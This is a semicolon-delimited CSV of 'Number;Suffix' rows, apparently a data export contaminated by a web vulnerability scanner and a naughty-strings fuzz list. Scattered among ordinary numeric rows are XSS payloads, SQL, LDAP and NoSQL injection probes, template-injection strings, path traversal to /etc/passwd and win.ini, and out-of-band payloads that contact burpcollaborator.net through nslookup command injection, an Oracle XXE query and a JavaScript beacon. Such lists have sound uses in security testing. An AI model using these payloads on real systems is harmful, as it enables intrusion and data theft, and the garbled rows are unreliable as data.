Number;Suffix;
26;A;
938;;
938;;
68;NULL;
7;A;
938;;
938;åß∂ƒ©˙∆˚¬…æ;
938;;
938;;
1,00E+02;;
923;;
24;NULL;
705;;
71;NULL;
17;NULL;
24;NULL;
68;NULL;
753tb4j95gk0%41cdk2eb6a7e;;
34;a;
8;NULL;
938;;
71;NULL;
26;A;
39;NULL;
39;NULL;
36;;
71;NULL;
1;NULL;
71;NULL;
1;X;
99;;
938;;
24;NULL;
39;NULL;
34;a;
68;NULL;
938;%22%60'%3e%3cscript%3e%5cxE1%5cx9A%5cx80javascript%3aalert(1)%3c%2fscript%3e;
7;A;
1;;
3;;
938;;
938;;
25;NULL;
938;%7b%22class%22%3a%22null%22,%22A%22%3a%22B%22%7d;
15;NULL;
39;NULL;
938;;
71;NULL;
938;;
"javascript:/*</script><img/onerror='-/""/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/r3v1dnhplggn7ccz22laectrmiscg34vvjn6eu3X;.burpcollaborator.net/).replace(/.;/g,[])]//'src=>";;
4;NULL;
938;;
25;;
71;NULL;
14;;
3;;
18;;
1;NULL;
75;;
938;;
75;;
938;%22%60'%3e%3cscript%3e%5cxE2%5cx80%5cx88javascript%3aalert(1)%3c%2fscript%3e;
4;NULL;
1;NULL;
17;NULL;
10;;
4;;
938;undef;
14;;
938;;
75;;
1;NULL;
26;A;
938;#;
75;;
75;]]>><;
1;B;
24;NULL;
17;NULL;
3;NULL;
24;NULL;
24;NULL;
938;%7b%22uid%22%3a1%7d;
938;;
1;NULL;
938;;
938;;
22;B;
938;;
938;null;
1;NULL;
501;NULL;
1;NULL;
938;;
71;NULL;
938;;
147;;
45;NULL;
9;NULL;
1;NULL;
39;NULL;
938;;
7;A;
s1zsqbqawx)(!(!(objectClass=*));;
39;NULL;
83;NULL;
938;;
4;NULL;
212;NULL;
938;;
75;;
75;;
24;NULL;
6;;
11;;
22;B;
3;;
20;NULL;
938;;
71;NULL;
17;NULL;
938;;
68;NULL;
3;;
68;NULL;
3;NULL;
938;;
3;NULL;
11;;
3;NULL;
1;NULL;
5;NULL;
37;A;
hSeokeIkE2lQ/zLKIStFvJP2n7uAHDsevtrFJ3X5nmE=;;
200;;
98;;
938;#;Strings%20which%20contain%20common%20unicode%20symbols%20(e%2eg%2e%20smart%20quotes)
75;;
938;;
22;a;
938;;
1;;
68;NULL;
8;NULL;
20;;
22;NULL;
938;#;MSDOS%2fWindows%20Special%20Filenames
19;NULL;
25;;
938;;
107;;
37;;
24;NULL;
501;NULL;
11;;
19;NULL;
71;NULL;
Infinity;;
15;;
50;NULL;
27;;
1;NULL;
8;NULL;
3;NULL;
938;;
10;NULL;
34;;
938;;
1;;
1;NULL;
4;NULL;
938;#;
18;;
39;NULL;
24;NULL;
83;;
25;NULL;
39;;
7;A;
938;%7b%22$or%22%3a%221%22%7d;
71;NULL;
8;NULL;
71;NULL;
10;NULL;
938;;
1;NULL;
80;NULL;
247;NULL;
50;;
7;A;
75' and 9902=9902'-- ;;
39;NULL;
4;NULL;
576;;
938;;
26;A;
938;;
75;;
49;;
274;;
30;;
938;;
938;;
68;;
26;A;
938;;
5;;
938;;
938;;
8;NULL;
938;;
1;NULL;
938;%22%60'%3e%3cscript%3e%5cxC2%5cxA0javascript%3aalert(1)%3c%2fscript%3e;
938;%3cscript%5cx3Etype%3d%22text%2fjavascript%22%3ejavascript%3aalert(1)%3b%3c%2fscript%3e;
19;NULL;
24;NULL;
71;NULL;
938;;
8;NULL;
35;;
71;NULL;
938;-2147483648%2f-1;
3;NULL;
1;NULL;
1;;
4;;
39;NULL;
10;;
938;;
501;NULL;
3;;
938;ABC%3cdiv%20style%3d%22x%3a%5cx00expression(javascript%3aalert(1)%22%3eDEF;
28;;
4;NULL;
75;;
3;;
39;NULL;
9;NULL;
1;NULL;
68;;
7;A;
1;NULL;
938;;
68;;
938;#;Quotation%20Marks
10;;
hSeokeIkE2lQ/zLKIStFvJP2n7uAHDsevtrFJ3X5nmE=;;
150;NULL;
2;;
938;1;
2;NULL;
938;%3cimg%20src%5cx10%3dx%20onerror%3d%22javascript%3aalert(1)%22%3e;
74;;
25;NULL;
75;;
24;NULL;
938;;
116;;
75;;
938;%22%60'%3e%3cscript%3e%5cxE2%5cx80%5cx86javascript%3aalert(1)%3c%2fscript%3e;
4;NULL;
8;;
938;ABC%3cdiv%20style%3d%22x%5cx3Aexpression(javascript%3aalert(1)%22%3eDEF;
938;#;Unicode%20Numbers
938;;
4;E;
11;;
2;NULL;
71;NULL;
75;;
31;NULL;
17;NULL;
26;A;
938;;
4;NULL;
2;A;
938;#;Numeric%20Strings
26;A;
26;A;
24;NULL;
17;NULL;
6;NULL;
80;NULL;
170;;
45;NULL;
75;;
11;;
938;;
938;;
19;NULL;
8;NULL;
938;undefined;
3;;
39;NULL;
24;NULL;
71;NULL;
29;;
938;𠜎𠜱𠝹𠱓𠱸𠲖𠳏;
17;NULL;
17;NULL;
1;NULL;
25;NULL;
24;NULL;
938;;
26;A;
938;;
18;;
1;NULL;
938;%60%22'%3e%3cimg%20src%3dxxx%3ax%20%5cx2Fonerror%3djavascript%3aalert(1)%3e;
892;;
8;;
938;;
938;;
938;;
75;;
17;;
938;;
34;a;
938;;
25;NULL;
75;;
8;;
1;NULL;
11;;
938;;
39;NULL;
243;2;
78;;
75;;
10;NULL;
150;NULL;
26;A;
5;a;
938;;
34;a;
938;%3cimg%20src%3dx%20onerror%3dalert(123)%20%2f%3e;
71;NULL;
8;;
71;NULL;
68;NULL;
938;;
200;;
40;1;
75;;
5;NULL;
20;NULL;
75;;
75;79507426' or 5549=5556-- ;
938;;
938;;
19;;
938;;
71;NULL;
247;NULL;
75;;
938;;
4;NULL;
83;NULL;
39;NULL;
68;;
75;;
1;NULL;
12;;
39;NULL;
938;;
39;NULL;
39;NULL;
2;NULL;
75;tw6al8d1kl\\l8nbeb54i3;
34;a;
25;NULL;
71;NULL;
3;NULL;
71;NULL;
4;;
34;a;
938;;
938;%22%60'%3e%3cscript%3e%5cxE2%5cx80%5cx80javascript%3aalert(1)%3c%2fscript%3e;
7;NULL;
640;;
1;NULL;
68;NULL;
50;NULL;
71;NULL;
938;%3ci%20onwheel%3dalert(1)%3e%20Scroll%20over%20me%20%3c%2fi%3e;
938;;
14;;
71;NULL;
501;NULL;
17;NULL;
888;;
1;BS;
26;A;
938;;
80;NULL;
8;NULL;
212;NULL;
4;NULL;
75;;
75;;
68;;
34;a;
31;;
938;;
938;;
938;%7b%221%22%3a%220%22%7d;
9;NULL;
938;;
938;;
938;;
14;;
938;%7b%22$where%22%3a%221%22%7d;
938;;
938;;
8;NULL;
4;NULL;
938;;
938;1,23457E+38;
26;A;
3;NULL;
5;NULL;
938;;
65;NULL;
938;#%20%20%20%20%20%20%20Regional%20Indicator%20Symbols%20can%20be%20displayed%20differently%20across;
938;;
75;;
48;;
39;NULL;
19;NULL;
75;;
4;NULL;
938;;
116;;
19;NULL;
938;;
1;NULL;
41;NULL;
170;;
938;;
83;NULL;
8;NULL;
75;;
11;;
938;;
4;NULL;
1;NULL;
75;;
10;;
938;;
19;NULL;
26;A;
75;zerne%{912*703}s8enh;
83;NULL;
938;;
26;A;
247;NULL;
10;NULL;
39;NULL;
938;;
20;NULL;
4;NULL;
17;NULL;
938;;
938;CLOCK$;
938;;
15;;
41;;
938;;
938;;
3;NULL;
75;zm0cn{{605|add:227}}wis29;
938;;
938;;
26;A;
3;NULL;
15;;
71;NULL;
9;;
75 and (select*from(select(sleep(20)))a)-- ;;
938;;
15;NULL;
19;;
938;%3cimg%5cx32src%3dx%20onerror%3d%22javascript%3aalert(1)%22%3e;
20;NULL;
25;NULL;
2;NULL;
68;NULL;
75;;
20;;
71;NULL;
47;;
9;NULL;
19;NULL;
2;;
3;NULL;
26;A;
938;;
200;;
75;../../../../../../../../../../../../../../../../windows/win.ini;
938;;
938;;
938;;
938;0;
13;NULL;
10;;
1;NULL;
65;;
938;;
22;a;
75' and '9106'='9106';;
938;;
24;NULL;
938;;
938;;
4;NULL;
68;NULL;
1;NULL;
71;NULL;
17;;
75;*)(!(!(objectClass=*));
9;NULL;
938;;
75;;
938;;
17;NULL;
1;NULL;
3;NULL;
39;NULL;
9;NULL;
83;NULL;
8;NULL;
91;;
938;;
24;NULL;
39;NULL;
13;;
938;;
1;NULL;
25;NULL;
938;;
938;;
4;81;
12;NULL;
73;;
938;;
2;NULL;
212;NULL;
1;NULL;
7;A;
1;NULL;
938;;
3;NULL;
68;;
12;NULL;
31;NULL;
20;NULL;
938;;
938;;
25;NULL;
3;a;
75;b76j3mu1w8%41yvpkir5ssp;
4;NULL;
71;NULL;
938;;
49;D;
247;NULL;
938;;
938;;
938;%3ca%20href%3d%22javascript%5cx3A%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e;
10;;
938;;
75;' and '4129'='4129';
501;;
1;NULL;
938;;
4;NULL;
938;;
8;;
938;;
8;1;
938;;
17;NULL;
24;NULL;
938;;
501;NULL;
938;;
1;NULL;
312;;
3;NULL;
2;NULL;
43;NULL;
8;NULL;
2;NULL;
3;NULL;
3;;
938;;
247;NULL;
24;NULL;
75;..././..././..././..././..././..././..././..././..././..././etc/passwd;
8;NULL;
1;NULL;
84;A;
34;a;
26;A;
938;;
938;;
938;;
938;;
938;;
16;;
26;A;
938;;
68;NULL;
1;;
1;NULL;
9;NULL;
9;NULL;
75;;
938;;
1;NULL;
425;;
80;NULL;
30;;
24;NULL;
75;;
52;;
251;NULL;
83;NULL;
10;;
4;NULL;
71;NULL;
3;;
19;;
3;NULL;
15;;
22;a;
45;NULL;
1;NULL;
938;;
26;A;
1;NULL;
68;NULL;
150;NULL;
8;NULL;
12;NULL;
75;c:\windows\win.ini;
14;;
455;;
150;;
9;NULL;
938;;
45;NULL;
96;;
14;;
75;;
938;;
3;NULL;
26;A;
3;NULL;
1;NULL;
938;;
938;;
938;;
39;NULL;
13;;
123;;
938;;
11;;
1;A;
10;;
71;NULL;
1;NULL;
9;NULL;
938;;
1;;
17;NULL;
5;NULL;
18;;
75;' and 2829=2829-- ;
938;;
938;;
19;NULL;
938;#;Unicode%20Upsidedown
938;%3cimg%20src%3dx%5cx13onerror%3d%22javascript%3aalert(1)%22%3e;
80;NULL;
25;NULL;
2;NULL;
22;A;
85;;
4;;
1;;
247;NULL;
32;;
8;NULL;
83;NULL;
8;;
938;Craig%20Cockburn,%20Software%20Specialist;
938;;
1;NULL;
1;NULL;
75;;
938;;
8;NULL;
75;;
80;;
938;;
22;NULL;
1;NULL;
3;NULL;
75;;
3;NULL;
3;NULL;
0;;
4;NULL;
24;NULL;
22;NULL;
14;;
938;;
19;NULL;
938;;
17;NULL;
938;;
3;NULL;
45;D;
4;E;
247;NULL;
34;a;
43;;
753tb4j95gk0%41cdk2eb6a7e;;
3;NULL;
10;NULL;
8;NULL;
22;a;
251;NULL;
4;NULL;
12;;
4;;
938;ABC%3cdiv%20style%3d%22x%3a%5cxE2%5cx80%5cx88expression(javascript%3aalert(1)%22%3eDEF;
455;;
938;;
938;If%20you're%20reading%20this,%20you've%20been%20in%20a%20coma%20for%20almost%2020%20years%20now%2e%20We're%20trying%20a%20new%20technique%2e%20We%20don't%20know%20where%20this%20message%20will%20end%20up%20in%20your%20dream,%20but%20we%20hope%20it%20works%2e%20Please%20wake%20up,%20we%20miss%20you%2e;
938;;
3;NULL;
26;A;
33;;
2;NULL;
26;A;
938;;
1;NULL;
75;;
bdz0stzd99%416264dutt5d;;
938;;
247;NULL;
938;;
938;;
938;;
2;NULL;
75;;
150;NULL;
43;NULL;
75;;
17;NULL;
938;;
3;;
71;NULL;
17;NULL;
27;A;
938;;
938;;
19;NULL;
8;NULL;
938;;
2;NULL;
938;;
113;NULL;
938;;
938;;
938;ABC%3cdiv%20style%3d%22x%3a%5cx20expression(javascript%3aalert(1)%22%3eDEF;
31;;
25;NULL;
75;' and '8035'='8035;
80;NULL;
68;NULL;
938;;
9;NULL;
15;;
938;;
938;;
938;;
2;a;
938;;
938;%3cimg%20src%3dx%5cx09onerror%3d%22javascript%3aalert(1)%22%3e;
150;;
938;%3ca%20href%3d%22%5cx09javascript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e;
7;A;
75;;
31;;
71;NULL;
75;;
68;NULL;
938;ÅÍÎÏ˝ÓÔÒÚÆ☃;
6;;
8;NULL;
8;NULL;
938;;
75;;
25;NULL;
247;NULL;
456;;
5;a;
#set ($a=648*677) jwiu0${a}s0ujh;;
68;NULL;
1;NULL;
1;X;
24;NULL;
938;;
938;;
80;NULL;
10;;
3;NULL;
53;;
4;NULL;
1;NULL;
71;NULL;
938;;
938;̗̺͖̹̯͓Ṯ̤͍̥͇͈h̲́e͏͓̼̗̙̼̣͔%20͇̜̱̠͓͍ͅN͕͠e̗̱z̘̝̜̺͙p̤̺̹͍̯͚e̠̻̠͜r̨̤͍̺̖͔̖̖d̠̟̭̬̝͟i̦͖̩͓͔̤a̠̗̬͉̙n͚͜%20̻̞̰͚ͅh̵͉i̳̞v̢͇ḙ͎͟-҉̭̩̼͔m̤̭̫i͕͇̝̦n̗͙ḍ̟%20̯̲͕͞ǫ̟̯̰̲͙̻̝f%20̪̰̰̗̖̭̘͘c̦͍̲̞͍̩̙ḥ͚a̮͎̟̙͜ơ̩̹͎s̤%2e̝̝%20҉Z̡̖̜͖̰̣͉̜a͖̰͙̬͡l̲̫̳͍̩g̡̟̼̱͚̞̬ͅo̗͜%2e̟;
10;;
938;%3cscript%5cx09type%3d%22text%2fjavascript%22%3ejavascript%3aalert(1)%3b%3c%2fscript%3e;
39;NULL;
68;NULL;
938;;
9;;
75;;
19;NULL;
71;NULL;
3;NULL;
200;NULL;
938;;
22;;
14;;
938;;
7;A;
83;NULL;
1;;
22;NULL;
2;NULL;
75;;
18;;
938;;
13;NULL;
3;NULL;
25;NULL;
75;;
1;NULL;
75;;
hSeokeIkE2lQ/zLKIStFvJP2n7uAHDsevtrFJ3X5nmE=;;
938;;
938;;
91;;
75;;
22;NULL;
1;NULL;
83;NULL;
29;;
4;;
60;NULL;
2;;
75;;
501;NULL;
68;NULL;
938;;
83;NULL;
68;NULL;
83;NULL;
1;;
938;;
1;;
938;;
938;;
2;;
2;NULL;
19;NULL;
938;%3ca%20href%3d%22%5cx14javascript%3ajavascript%3aalert(1)%22%20id%3d%22fuzzelement1%22%3etest%3c%2fa%3e;
18;;
938;;
34;a;
39;NULL;
2;NULL;
938;;
938;;
8;;
68;NULL;
938;%22%60'%3e%3cscript%3e%5cx0Bjavascript%3aalert(1)%3c%2fscript%3e;
1;NULL;
938;;
10;;
938;%60⁄€‹›ﬁﬂ‡°·‚—±;
3;NULL;
938;;
938;;
1;NULL;
3;NULL;
17;NULL;
938;#;
34;;
938;;
4;NULL;
82;;
75;;
5;NULL;
12;;
24;NULL;
226;;
39;;
938;%3e%3cscript%3ealert(123)%3c%2fscript%3e;
24;;
205;;
938;;
75;;
938;;
200;;
71;NULL;
75' and '3278'='3278;;
11;;
938;;
938;;
68;NULL;
938;;
938;;
83;NULL;
938;%22%60'%3e%3cscript%3e%5cxE2%5cx80%5cx85javascript%3aalert(1)%3c%2fscript%3e;
8;Skûtmakker;
3;NULL;
938;;
938;;
34;a;
75;;
938;;
75;;
22;NULL;
19;NULL;
23;C;
384;;
75;;
938;;
7;A;
71;NULL;
390;;
68;NULL;
938;;
9;NULL;
22;4;
938;;
34;a;
61;;
75;;
39;NULL;
5;NULL;
19;NULL;
39;NULL;
938;;
24;NULL;
17;4;
1;NULL;
938;;
938;;
17;NULL;
4;NULL;
3;NULL;
8;NULL;
71;NULL;
10;;
71;NULL;
938;;
19;NULL;
4;NULL;
938;;
938;;
71;NULL;
11;;
716;;
79;a;
73;;
12;NULL;
2;NULL;
26;A;
45;NULL;
938;;
39;NULL;
938;;
26;A;
80;NULL;
3;NULL;
68;;
247;NULL;
2;NULL;
107;1;
2;NULL;
83;NULL;
8;NULL;
938;;
50;NULL;
1;NULL;
39;NULL;
938;;
71;NULL;
50;;
9;NULL;
1;NULL;
1;NULL;
8;NULL;
3;NULL;
6;NULL;
56;;
68;NULL;
80;NULL;
75;;
938;%7b0%7d;
938;;
938;;
26;A;
26;A;
75;;
71;NULL;
200;NULL;
75;8zt69gsf9eÁbm8jaapa4b;
938;;
75;;
5;NULL;
50;NULL;
npxt0${file.separator}z4aun;;
hSeokeIkE2lQ/zLKIStFvJP2n7uAHDsevtrFJ3X5nmE=;;
25;NULL;
938;;
938;'%20onfocus%3dJaVaSCript%3aalert(123)%20autofocus;
47;NULL;
1;NULL;
68;NULL;
1;NULL;
938;(｡◕%20∀%20◕｡);
45;NULL;
938;;
10;;
938;;
200;;
nslookup -q=cname plezvlzn3eylpauxk038wabp4gaay1mupih58tx.burpcollaborator.net.&;;
24;NULL;
247;NULL;
22;a;
22;NULL;
938;;
hSeokeIkE2lQ/zLKIStFvJP2n7uAHDsevtrFJ3X5nmE=;;
1;;
90;;
938;%2b0%2e0;
11;;
29;;
1;NULL;
1;NULL;
71;NULL;
11;;
39;NULL;
25;NULL;
45;NULL;
938;;
41;NULL;
4;NULL;
938;[1,2];
3;A2;
71;NULL;
15;;
1HNeOiZeFu7gP1lxi5tdAwGcB9i2xR+Q2jpmbuwTqzU=;;
39;NULL;
3;;
938;;
80;NULL;
19;NULL;
39;NULL;
938;Kernel%2eexit(1);
75;;
20;;
179;;
68;NULL;
71;NULL;
39;NULL;
39;NULL;
12;;
24;NULL;
938;;
938;;
938;;
1;;
46;;
4;NULL;
34;a;
1;NULL;
938;;
938;;
938;;
1;NULL;
7;A;
13;NULL;
938;#%20The%20next%20line%20may%20appear%20to%20be%20blank,%20mojibake,%20or%20dingbats%20in%20some%20viewers%2e;
938;;
1;;
938;;
938;;
68;NULL;
75;;
25;NULL;
938;%22%60'%3e%3cscript%3e%5cx7Ejavascript%3aalert(1)%3c%2fscript%3e;
938;;
938;'';
3;;
71;NULL;
58;;
938;;
2;NULL;
56;;
10;NULL;
21;;
83;NULL;
938;%3c%3cSCRIPT%3ealert(%22XSS%22)%3b%2f%2f%3c%3c%2fSCRIPT%3e;
17;NULL;
15;NULL;
938;;
938;;
938;;
938;;
938;;
24;NULL;
68;NULL;
938;;
938;;
938;;
938;'%60%22%3e%3c%5cx00script%3ejavascript%3aalert(1)%3c%2fscript%3e;
938;;
19;NULL;
938;;
25;NULL;
3;NULL;
85;;
4;NULL;
26;A;
15;;
1;NULL;
938;;
938;;
36;H;
44;;
84;;
938;;
75;NULL;
24;NULL;
10;;
116;;
938;NaN;
3;NULL;
2;;
1;;
150;NULL;
938;;
19;;
71;NULL;
938;#;Strings%20that%20test%20for%20known%20vulnerabilities
938;;
938;#;Trick%20Unicode
938;;
83;NULL;
68;NULL;
83;NULL;
30;;
938;-,;
31;NULL;
11;;
427;;
83;NULL;
11;;
24;;
25;NULL;
24;NULL;
33;;
938;;
938;;
"(select extractvalue(xmltype('<?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE root [ <!ENTITY % dgpdx SYSTEM ""http://ygi8quuwyntukjp6f9yhrj6yzp5jtahd55swgl.burpcollab'||'orator.net/"">%dgpdx;]>'),'/l') from dual)";;
33;;
35;;
938;;
15;A;
938;;
15;;
51;;
938;;
22;NULL;
1;;
68;NULL;
938;;
22;NULL;
39;NULL;
938;;
938;;
68;NULL;
938;;
2;NULL;
938;;
22;NULL;
9;;
1;NULL;
938;;
17;NULL;
"75vf0bs%>axqlp'/""<ii43e";;
17;;
220;;
40;18;
19;NULL;
68;NULL;
13;;
75;;
938;;
938;1%2f0;
39;NULL;
19;;
19;NULL;
75 and 3613=03613-- ;;
68;;
75;;
41;NULL;
938;;
17;NULL;
1;NULL;
22;NULL;
10;;
150;;
938;;
3;NULL;
19;NULL;
24;NULL;
243;2;
10;;
25;NULL;
938;;
34;a;
10;;
19;NULL;
50;;
8;NULL;
75;;
17;NULL;
938;Œ„´‰ˇÁ¨ˆØ∏”’;
938;;
22;NULL;
26;A;
8;NULL;
938;;
19;NULL;
938;;
21;;
938;;
501;NULL;
22;;
501;NULL;
39;NULL;
938;%22%60'%3e%3cscript%3e%5cx20javascript%3aalert(1)%3c%2fscript%3e;
39;NULL;
938;;
938;;
25;NULL;
1;NULL;
1;D;
19;NULL;
12;NULL;
5154;;
71;NULL;
1;NULL;
3;NULL;
2;NULL;
938;;
938;;
25;NULL;
938;;
8;;
53;NULL;
938;;
938;;
1;NULL;
2;NULL;
24;NULL;
17;NULL;
501;NULL;
11;;
19;NULL;
39;NULL;
21;;
10;;
25;NULL;
3;;
34;a;
501;NULL;
iuyd7%{259*179}xds17;;
60;;
4;NULL;
1;;
3;NULL;
938;;
6;NULL;
10;;
